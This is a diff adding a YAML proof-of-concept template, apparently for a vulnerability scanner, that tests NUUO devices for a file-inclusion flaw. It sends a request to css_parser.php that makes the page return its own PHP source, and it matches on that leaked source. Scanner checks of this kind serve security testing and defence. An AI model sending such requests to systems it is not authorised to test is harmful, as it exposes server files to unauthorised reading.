@@ -1,0 +1,22 @@
+id: poc-yaml-nuuo-file-inclusion
+info:
+  name: Nuuo File Inclusion
+  severity: medium
+  tags:
+  - 文件包含
+  finger: Nuuo File Inclusion
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /css_parser.php?css=css_parser.php
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(headers, "content-type") && contains(headers,
+    "text/css") && contains(body, "$_GET['css']")
+  output: []
